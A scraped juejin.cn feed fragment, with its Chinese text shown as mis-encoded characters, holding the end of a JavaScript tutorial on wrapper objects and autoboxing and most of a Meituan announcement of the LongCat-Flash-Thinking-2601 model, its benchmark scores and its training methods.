<span class="hljs-keyword">if</span> (falsyStrObj) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"This will print!"</span>); <span class="hljs-comment">// å³ä½¿å­—ç¬¦ä¸²ä¸ºç©ºï¼Œå¯¹è±¡æœ¬èº«æ˜¯ truthyï¼</span>
}

<span class="hljs-comment">// æ­£ç¡®ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> falsyStr = <span class="hljs-string">""</span>; <span class="hljs-comment">// ç©ºå­—ç¬¦ä¸²åŸºæœ¬ç±»å‹</span>
<span class="hljs-keyword">if</span> (falsyStr) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"This will NOT print."</span>); <span class="hljs-comment">// ç©ºå­—ç¬¦ä¸²åŸºæœ¬ç±»å‹æ˜¯ falsy</span>
}
</code></pre>
<h4 data-id="heading-6">å…­ã€æ€»ç»“</h4>
<p>é€šè¿‡æœ¬æ–‡ï¼Œæˆ‘ä»¬äº†è§£åˆ°ï¼š</p>
<ul>
<li>JavaScript çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå¦‚ <code>string</code>, <code>number</code>, <code>boolean</code>ï¼‰æœ¬èº«æ²¡æœ‰å±æ€§å’Œæ–¹æ³•ã€‚</li>
<li><code>String</code>, <code>Number</code>, <code>Boolean</code> æ˜¯å¯¹åº”çš„<strong>åŒ…è£…å¯¹è±¡</strong>ï¼Œæ˜¯å¼•ç”¨ç±»å‹ï¼Œæ‹¥æœ‰ä¸°å¯Œçš„å±æ€§å’Œæ–¹æ³•ã€‚</li>
<li>å½“æˆ‘ä»¬è®¿é—®åŸºæœ¬ç±»å‹å€¼çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼ŒJavaScript å¼•æ“ä¼šæ‰§è¡Œ<strong>è‡ªåŠ¨è£…ç®±</strong>ï¼Œä¸´æ—¶å°†å…¶è½¬æ¢ä¸ºå¯¹åº”çš„åŒ…è£…å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œæ“ä½œå®Œæ¯•åç«‹å³é”€æ¯ä¸´æ—¶å¯¹è±¡ã€‚</li>
<li>è¿™ä¸ªæœºåˆ¶è®©æˆ‘ä»¬èƒ½å¤Ÿæ–¹ä¾¿åœ°åœ¨åŸºæœ¬ç±»å‹ä¸Šä½¿ç”¨å„ç§æ–¹æ³•ï¼Œè€Œæ— éœ€æ‰‹åŠ¨è¿›è¡Œç±»å‹è½¬æ¢ã€‚</li>
</ul>
<p>ç†è§£â€œè‡ªåŠ¨è£…ç®±â€è¿™ä¸€æ ¸å¿ƒæ¦‚å¿µï¼Œæœ‰åŠ©äºæˆ‘ä»¬æ›´æ·±åˆ»åœ°è®¤è¯† JavaScript çš„è¿è¡Œæœºåˆ¶ï¼Œå†™å‡ºæ›´ä¸¥è°¨ã€é«˜æ•ˆçš„ä»£ç ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¾å›¢ LongCat-Flash-Thinking-2601 å‘å¸ƒï¼Œå·¥å…·è°ƒç”¨èƒ½åŠ›ç™»é¡¶å¼€æº SOTAï¼]]></title>    <link>https://juejin.cn/post/7596919439019868169</link>    <guid>https://juejin.cn/post/7596919439019868169</guid>    <pubDate>2026-01-20T01:43:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596919439019868169" data-draft-id="7596966040921391110" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¾å›¢ LongCat-Flash-Thinking-2601 å‘å¸ƒï¼Œå·¥å…·è°ƒç”¨èƒ½åŠ›ç™»é¡¶å¼€æº SOTAï¼"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T01:43:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3509296845313741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¾å›¢ LongCat-Flash-Thinking-2601 å‘å¸ƒï¼Œå·¥å…·è°ƒç”¨èƒ½åŠ›ç™»é¡¶å¼€æº SOTAï¼
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47ccb42d726640a7889ba1e64ae203e6~tplv-k3u1fbpfcp-watermark.image" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ" class="title" data-v-d326b38e="">ç¾å›¢æŠ€æœ¯å›¢é˜Ÿ</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2026-01-20T01:43:04.000Z" title="Tue Jan 20 2026 01:43:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2026-01-20
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                é˜…è¯»7åˆ†é’Ÿ
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        å…³æ³¨
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              ç¾å›¢å°ç¼– @ç¾å›¢
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘æ—¥ï¼Œç¾å›¢ LongCat å›¢é˜Ÿæ­£å¼å¯¹å¤–å‘å¸ƒå¹¶å¼€æº LongCat-Flash-Thinking-2601ã€‚ä½œä¸ºå·²å‘å¸ƒçš„ LongCat-Flash-Thinking æ¨¡å‹çš„å‡çº§ç‰ˆï¼ŒLongCat-Flash-Thinking-2601 åœ¨ Agentic Searchï¼ˆæ™ºèƒ½ä½“æœç´¢ï¼‰ã€Agentic Tool Useï¼ˆæ™ºèƒ½ä½“å·¥å…·è°ƒç”¨ï¼‰ã€TIRï¼ˆå·¥å…·äº¤äº’æ¨ç†ï¼‰ç­‰æ ¸å¿ƒè¯„æµ‹åŸºå‡†ä¸Šï¼Œå‡è¾¾åˆ°å¼€æºæ¨¡å‹ SOTA æ°´å¹³ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b2999574354499e91105f2768f6024a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=4T7JbhzCpG7%2FvS1LiL3i4hpkteY%3D" alt="" loading="lazy"/></p>
<p>è¯¥æ¨¡å‹å°¤å…¶åœ¨å·¥å…·è°ƒç”¨ä¸Šè¡¨ç°å‡ºå“è¶Šçš„æ³›åŒ–èƒ½åŠ›ï¼Œåœ¨ä¾èµ–å·¥å…·è°ƒç”¨çš„éšæœºå¤æ‚ä»»åŠ¡ä¸­æ€§èƒ½è¶…è¶Šäº† Claudeï¼Œå¯å¤§å¹…åº¦é™ä½çœŸå®åœºæ™¯ä¸‹æ–°å·¥å…·çš„é€‚é…è®­ç»ƒæˆæœ¬ï¼›åŒæ—¶å®ƒæ˜¯é¦–ä¸ªå®Œæ•´å¼€æºå¹¶æ”¯æŒåœ¨çº¿å…è´¹ä½“éªŒã€Œé‡æ€è€ƒæ¨¡å¼ã€çš„æ¨¡å‹ï¼ŒåŒæ—¶å¯åŠ¨ 8 ä¸ªå¤§è„‘é£é€Ÿè¿è½¬ï¼Œç¡®ä¿æ€è€ƒå‘¨å…¨ã€å†³ç­–å¯é ã€‚</p>
<p>ç›®å‰è¯¥åŠŸèƒ½å·²ç»å¯ä»¥åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Flongcat.ai" target="_blank" title="https://longcat.ai" ref="nofollow noopener noreferrer">longcat.ai</a> ç½‘ç«™å…è´¹ä½“éªŒï¼ˆä»…é€‰æ‹©æ·±åº¦æ€è€ƒåŠŸèƒ½æ—¶ä¼šè§¦å‘é‡æ€è€ƒæ¨¡å¼ï¼‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d2b11c782fc4ac6b8113f53c7822529~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=iYjVRDw0F3QxwP%2BUUEhfX130UFk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">01 åˆ›æ–°çš„ã€Œé‡æ€è€ƒã€æ¨¡å¼ï¼šè®©æ¨¡å‹å­¦ä¼šâ€œæ·±æ€ç†Ÿè™‘â€</h2>
<p>å…¨æ–°å‡çº§çš„ã€Œé‡æ€è€ƒã€æ¨¡å¼ï¼Œè®©æ¨¡å‹å­¦ä¼šäº†â€œæ·±æ€ç†Ÿè™‘â€å†è¡ŒåŠ¨ï¼Œé‡åˆ°é«˜éš¾åº¦é—®é¢˜æ—¶ï¼Œæ¨¡å‹ä¼šæŠŠæ€è€ƒè¿‡ç¨‹æ‹†æˆå¹¶è¡Œæ€è€ƒå’Œæ€»ç»“å½’çº³ä¸¤æ­¥æ¥åšï¼š</p>
<p>å¹¶è¡Œæ€è€ƒé˜¶æ®µï¼Œæ¨¡å‹ä¼šåŒæ—¶ç‹¬ç«‹æ¢³ç†å‡ºå¥½å‡ æ¡æ¨ç†è·¯å¾„ï¼Œå°±è·Ÿäººé¢å¯¹éš¾é¢˜æ—¶ä¼šç¢ç£¨ä¸åŒè§£æ³•ä¸€ä¸ªé“ç†ï¼Œè¿˜ä¼šç‰¹æ„ä¿è¯æ€è·¯çš„å¤šæ ·æ€§ï¼Œç”Ÿæ€•æ¼æ‰æœ€ä¼˜è§£ï¼›</p>
<p>æ€»ç»“å½’çº³é˜¶æ®µï¼Œå¯¹å¤šæ¡è·¯å¾„è¿›è¡Œæ¢³ç†ã€ä¼˜åŒ–ä¸åˆæˆï¼Œå¹¶å°†ä¼˜åŒ–ç»“æœé‡æ–°è¾“å…¥ï¼Œå½¢æˆé—­ç¯è¿­ä»£æ¨ç†ï¼Œæ¨åŠ¨æ€è€ƒæŒç»­æ·±åŒ–ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜ä¸“é—¨è®¾è®¡äº†é¢å¤–çš„å¼ºåŒ–å­¦ä¹ ç¯èŠ‚ï¼Œé’ˆå¯¹æ€§æ‰“ç£¨æ¨¡å‹çš„æ€»ç»“å½’çº³èƒ½åŠ›ï¼Œè®© LongCat-Flash-Thinking-2601 çœŸæ­£å®ç°â€œæƒ³æ¸…æ¥šå†è¡ŒåŠ¨â€ã€‚</p>
<h2 data-id="heading-1">02 æ™ºèƒ½ä½“å·¥å…·è°ƒç”¨èƒ½åŠ›ç™»é¡¶å¼€æº SOTA</h2>
<p>ç»è¿‡å…¨é¢ä¸¥è°¨çš„è¯„ä¼°æ˜¾ç¤ºï¼ŒLongCat-Flash-Thinking-2601 æ¨¡å‹åœ¨ç¼–ç¨‹ã€æ•°å­¦æ¨ç†ã€æ™ºèƒ½ä½“å·¥å…·è°ƒç”¨ã€æ™ºèƒ½ä½“æœç´¢ç»´åº¦è¡¨ç°å…¨é¢é¢†å…ˆï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98cec7057fb94bb998c63782187feb91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=RXG4VeL5fiqwRaC9YQfhX9EbT3g%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>ç¼–ç¨‹èƒ½åŠ›</strong>ï¼šLongCat-Flash-Thinking-2601 åœ¨ LCB è¯„æµ‹ä¸­å–å¾— 82.8 åˆ†ï¼ŒOIBench EN è¯„æµ‹è· 47.7 åˆ†ï¼Œæˆç»©å¤„äºåŒç±»æ¨¡å‹ç¬¬ä¸€æ¢¯é˜Ÿï¼Œå±•ç°å‡ºæ‰å®çš„ä»£ç åŸºç¡€èƒ½åŠ›ã€‚</li>
<li><strong>æ•°å­¦æ¨ç†èƒ½åŠ›</strong>ï¼šåœ¨å¼€å¯é‡æ€è€ƒæ¨¡å¼åè¡¨ç°çªå‡ºï¼ŒLongCat-Flash-Thinking-2601 åœ¨ AIME-25 è¯„æµ‹ä¸­è· 100.0 åˆ†ï¼ˆæ»¡åˆ†ï¼‰ï¼ŒIMO-AnswerBench ä¸­ä»¥ 86.8 åˆ†è¾¾åˆ°å½“å‰ SOTAã€‚</li>
<li><strong>æ™ºèƒ½ä½“å·¥å…·è°ƒç”¨èƒ½åŠ›</strong>ï¼šåœ¨ Ï„Â²-Bench è¯„æµ‹ä¸­æ‹¿åˆ° 88.2 åˆ†ï¼ŒVitaBench è¯„æµ‹ä¸­è·å¾— 29.3 åˆ†ï¼Œå‡è·å¾—å¼€æº SOTA æ°´å¹³ï¼Œåœ¨å¤šé¢†åŸŸå·¥å…·è°ƒç”¨åœºæ™¯ä¸‹è¡¨ç°ä¼˜å¼‚ï¼Œé€‚é…å®é™…åº”ç”¨éœ€æ±‚ã€‚</li>
<li><strong>æ™ºèƒ½ä½“æœç´¢èƒ½åŠ›</strong>ï¼šåœ¨ BrowseComp ä»»åŠ¡ä¸­å–å¾— 73.1 åˆ†ï¼ˆå…¨æ¨¡å‹æœ€ä¼˜ï¼‰ï¼ŒRW Search è¯„æµ‹è· 79.5 åˆ†ï¼ŒLongCat-Flash-Thinking-2601 å…·å¤‡å¼ºåŠ²çš„ä¿¡æ¯æ£€ç´¢ä¸åœºæ™¯é€‚é…èƒ½åŠ›ï¼Œè¾¾åˆ°å¼€æºé¢†å…ˆæ°´å¹³ã€‚</li>
</ul>
<p>åŒæ—¶ï¼Œ<strong>ä¸ºäº†æ›´å¥½çš„æµ‹è¯•æ™ºèƒ½ä½“æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§å…¨æ–°çš„è¯„æµ‹æ–¹æ³•</strong>â€”â€”é€šè¿‡æ„å»ºä¸€å¥—è‡ªåŠ¨åŒ–ä»»åŠ¡åˆæˆæµç¨‹ï¼Œæ”¯æŒç”¨æˆ·åŸºäºç»™å®šå…³é”®è¯ï¼Œä¸ºä»»æ„åœºæ™¯éšæœºç”Ÿæˆå¤æ‚ä»»åŠ¡ã€‚æ¯ä¸ªç”Ÿæˆçš„ä»»åŠ¡éƒ½é…å¤‡äº†å¯¹åº”çš„å·¥å…·é›†ä¸å¯æ‰§è¡Œç¯å¢ƒã€‚ç”±äºè¿™ç±»ç¯å¢ƒä¸­çš„å·¥å…·é…ç½®å…·æœ‰é«˜åº¦éšæœºæ€§ï¼Œæˆ‘ä»¬é€šè¿‡è¯„ä¼°æ¨¡å‹åœ¨è¯¥ç±»ç¯å¢ƒä¸­çš„æ€§èƒ½è¡¨ç°ï¼Œæ¥è¡¡é‡å…¶æ³›åŒ–èƒ½åŠ›ã€‚å®éªŒç»“æœè¡¨æ˜ï¼ŒLongCat-Flash-Thinking-2601 åœ¨ç»å¤§å¤šæ•°ä»»åŠ¡ä¸­ä¿æŒé¢†å…ˆæ€§èƒ½ï¼Œå°è¯äº†å…¶åœ¨æ™ºèƒ½ä½“åœºæ™¯ä¸‹å¼ºå¤§çš„æ³›åŒ–èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-2">03 æ ¸å¿ƒæŠ€æœ¯çªç ´ï¼šæ—¢èƒ½â€œæ‰“ç¡¬ä»—â€ä¹Ÿèƒ½â€œæŠ—å¹²æ‰°â€</h2>
<h3 data-id="heading-3">3.1 ç¯å¢ƒæ‰©å±•ä¸å¤šç¯å¢ƒå¼ºåŒ–å­¦ä¹  ï¼šä»â€œé¶åœºâ€åˆ°â€œå®æˆ˜â€</h3>
<p>ä¼ ç»Ÿæ™ºèƒ½ä½“å¤§å¤šåªåœ¨å‡ ä¸ªç®€å•æ¨¡æ‹Ÿç¯å¢ƒé‡Œè®­ç»ƒï¼Œå°±åƒå£«å…µåªç»ƒè¿‡é¶åœºï¼Œåˆ°äº†çœŸå®â€œæˆ˜åœºâ€å°±æ‰é“¾å­ã€‚è€ŒåŸºäºâ€œç¯å¢ƒæ‰©å±•+å¤šç¯å¢ƒå¼ºåŒ–å­¦ä¹ â€æ ¸å¿ƒæŠ€æœ¯ï¼Œä¸ºæ¨¡å‹æ‰“é€ äº†å¤šæ ·åŒ–çš„â€œé«˜å¼ºåº¦ç»ƒå…µåœºâ€ï¼Œæ„å»ºäº†å¤šå¥—é«˜è´¨é‡è®­ç»ƒç¯å¢ƒï¼Œæ¯å¥—é›†æˆ 60 ä½™ç§å·¥å…·å¹¶å½¢æˆå¯†é›†ä¾èµ–å…³ç³»å›¾è°±ä¸å¤æ‚è”åŠ¨ï¼Œæ”¯æ’‘èµ·é«˜åº¦å¤æ‚çš„ä»»åŠ¡åœºæ™¯ã€‚å®éªŒè¯æ˜ï¼Œ<strong>è®­ç»ƒç¯å¢ƒè¶Šä¸°å¯Œï¼Œæ¨¡å‹åœ¨æœªçŸ¥åœºæ™¯ä¸­çš„æ³›åŒ–èƒ½åŠ›è¶Šå¼º</strong>ã€‚å¾—ç›Šäºè¿™å¥—æ–¹æ¡ˆï¼ŒLongCat-Flash-Thinking-2601 åœ¨æ™ºèƒ½ä½“æœç´¢ã€æ™ºèƒ½ä½“å·¥å…·è°ƒç”¨ç­‰æ ¸å¿ƒåŸºå‡†æµ‹è¯•ä¸­ç¨³å±…å‰åˆ—ã€‚å°¤å…¶åœ¨å¤æ‚éšæœºçš„åˆ†å¸ƒå¤–ä»»åŠ¡ä¸­æ€§èƒ½ä¼˜äº Claudeã€‚</p>
<p>åŒæ—¶æˆ‘ä»¬é’ˆå¯¹æ€§æ‰©å±• <strong>è‡ªç ”å¼ºåŒ–å­¦ä¹ åŸºç¡€è®¾æ–½ï¼ˆDORAï¼‰</strong>ï¼Œåœ¨ä¿ç•™åŸæœ‰é«˜æ•ˆå¼‚æ­¥è®­ç»ƒç‰¹æ€§çš„åŸºç¡€ä¸Šå®ç°å¤§è§„æ¨¡å¤šç¯å¢ƒæ™ºèƒ½ä½“çš„ç¨³å®šå¹¶è¡Œè®­ç»ƒï¼Œé€šè¿‡å‡è¡¡æ­é…å¤šç¯å¢ƒä»»åŠ¡ã€æŒ‰éš¾åº¦ä¸è®­ç»ƒè¿›åº¦æ™ºèƒ½åˆ†é…ç®—åŠ›ï¼Œæœ€å¤§åŒ–æå‡è®­ç»ƒæ•ˆç‡ä¸èµ„æºåˆ©ç”¨ç‡ï¼Œç­‘ç‰¢èƒ½åŠ›æ ¹åŸºã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜ä»å¤æ‚åº¦ã€å¤šæ ·æ€§åŒç»´åº¦ä¸¥æ§è®­ç»ƒä»»åŠ¡ï¼Œé…å¥—ä¸“å±æ•°æ®åº“åŠä¼˜åŒ–æ–¹æ¡ˆï¼Œæœç»æ¨¡å‹â€œåç§‘â€ä¸è®­ç»ƒæ¼æ´ï¼Œè®©è¿™å¥—å…¨æµç¨‹æ–¹æ¡ˆæŒç»­èµ‹èƒ½æ¨¡å‹ï¼Œç¨³å±…æ™ºèƒ½ä½“èƒ½åŠ›ç¬¬ä¸€æ¢¯é˜Ÿã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d6d5ec68f314521803563c3dd7e14c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=x4N2SgZXBYDydXTlT4dhJ7JrzkE%3D" alt="ç¨³å®šä¸Šæ¶¨çš„å¤šç¯å¢ƒæ··åˆå¼ºåŒ–å­¦ä¹ è®­ç»ƒæ›²çº¿" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74b20c82e22f4af9b033f490e6998148~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478184&amp;x-signature=vjUjafKNZd9%2FKhvb4KbrYjk64IQ%3D" alt="å¤šç¯å¢ƒå¼ºåŒ–å­¦ä¹ è®­ç»ƒä¸‹ä¸åŒ OOD æµ‹è¯•é›†ä¸Šçš„ RL Scaling è¡¨ç°" loading="lazy"/></p>
<h3 data-id="heading-4">3.2 å™ªå£°ç¯å¢ƒä¸‹çš„ç¨³å¥è®­ç»ƒï¼šè®©æ™ºèƒ½ä½“æ›´â€œæŠ—é€ â€</h3>
